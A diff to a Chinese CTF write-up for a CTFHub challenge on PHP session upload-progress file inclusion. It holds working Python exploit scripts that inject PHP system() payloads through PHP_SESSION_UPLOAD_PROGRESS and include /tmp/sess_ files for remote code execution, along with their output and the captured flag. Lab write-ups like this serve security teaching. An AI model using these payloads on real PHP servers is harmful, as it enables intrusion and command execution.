@@ -115,10 +115,80 @@ phpinfo() 中对 session 的支持
 
  session.upload_progress.cleanup 是 PHP 中用于配置上传文件进度监视器的选项之一。它用于定义是否在上传完成后自动清理上传进度数据。默认情况下，该选项设置为 On，这意味着当文件上传完成后，PHP 会自动清理掉与该上传进度相关的数据，这样可以避免上传进度数据占用服务器资源。
 
-因为 session.upload_progress.cleanup 没有开启，不会及时的清理 session 文件，所以直接传文件，然后用题目中的 include 包含进去就可以了
+因为 session.upload_progress.cleanup 没有开启，不会及时的清理 session 文件，所以直接传文件，然后用题目中的 include 包含进去就可以了。
 
-### 传包
+`PHP_SESSION_UPLOAD_PROGRESS` 是一个 PHP 的预定义常量，用于存储上传文件进度的会话变量名。在 PHP 中，当上传文件时，可以使用这个会话变量来跟踪文件上传的进度。
 
-### 访问 session 文件
+在 Cookie 里设置 PHPSESSID=flag，PHP 将会在服务器上创建一个文件：/tmp/sess_flag
+
+### 执行恶意代码
+
+`requests.Session()` 
+
+- 自定义 `cookies={ 'PHPSESSID': sessid }`
+
+- 注入恶意代码 `data={ 'PHP_SESSION_UPLOAD_PROGRESS': '<?php system('ls /')?>' }`
+- `files={ 'file': file}`
+
+```python
+		res = requests.session().post(
+        url=url, 
+        data={ "PHP_SESSION_UPLOAD_PROGRESS": "<?php system('ls /');?>" }, 
+        files={ 'file': file }, 
+        cookies={ 'PHPSESSID': sessid }
+        )
+```
+
+直接访问 `url/?file=/tmp/sess_<sessid>`
+
+upload_progress_|a:5:{s:10:"start_time";i:1710472614;s:14:"content_length";i:283;s:15:"bytes_processed";i:283;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:4:"file";s:8:"tmp_name";s:14:"/tmp/phpdc9UCP";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1710472614;s:15:"bytes_processed";i:8;}}}upload_progress_bin boot dev etc flag_is_here_not_are_but_you_find home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var |a:5:{s:10:"start_time";i:1710473383;s:14:"content_length";i:278;s:15:"bytes_processed";i:278;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:4:"file";s:8:"tmp_name";s:14:"/tmp/phpWslbzp";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1710473383;s:15:"bytes_processed";i:8;}}}
 
 ## 3、exp
+
+（1）获取 flag 位置：flag_is_here_not_are_but_you_find
+
+```python
+import requests
+
+
+url = "http://challenge-d360e9f051a3b562.sandbox.ctfhub.com:10800"
+file = "test.txt"
+session_id = "flag"
+
+
+if __name__ == '__main__':
+    res = requests.session().post(
+        url=url, 
+        data={ "PHP_SESSION_UPLOAD_PROGRESS": "<?php system('ls /')?>" }, 
+        files={ 'file': file }, 
+        cookies={ 'PHPSESSID': session_id }
+        )
+    print(res.text)
+```
+
+upload_progress_|a:5:{s:10:"start_time";i:1710472614;s:14:"content_length";i:283;s:15:"bytes_processed";i:283;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:4:"file";s:8:"tmp_name";s:14:"/tmp/phpdc9UCP";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1710472614;s:15:"bytes_processed";i:8;}}}upload_progress_bin boot dev etc flag_is_here_not_are_but_you_find home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var |a:5:{s:10:"start_time";i:1710473383;s:14:"content_length";i:278;s:15:"bytes_processed";i:278;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:4:"file";s:8:"tmp_name";s:14:"/tmp/phpWslbzp";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1710473383;s:15:"bytes_processed";i:8;}}}
+
+（2）获取 flag
+
+```python
+import requests
+
+
+url = "http://challenge-d360e9f051a3b562.sandbox.ctfhub.com:10800"
+file = "test.txt"
+session_id = "flag"
+
+
+if __name__ == '__main__':
+    res = requests.session().post(
+        url=url, 
+        data={ "PHP_SESSION_UPLOAD_PROGRESS": "<?php system('cat /flag_is_here_not_are_but_you_find');?>" }, 
+        files={ 'file': file }, 
+        cookies={ 'PHPSESSID': session_id }
+        )
+    print(res.text)
+```
+
+{s:10:"field_name";s:4:"file";s:4:"name";s:4:"file";s:8:"tmp_name";s:14:"/tmp/phpLOMfc2";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1710473906;s:15:"bytes_processed";i:8;}}}upload_progress_ctfhub{3c445a74790912aad2150c33} |a:5:{s:10:"start_time";i:1710473945;s:14:"content_length";i:313;s:15:"bytes_processed";i:313;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:
+
+得到 flag：ctfhub{3c445a74790912aad2150c33}
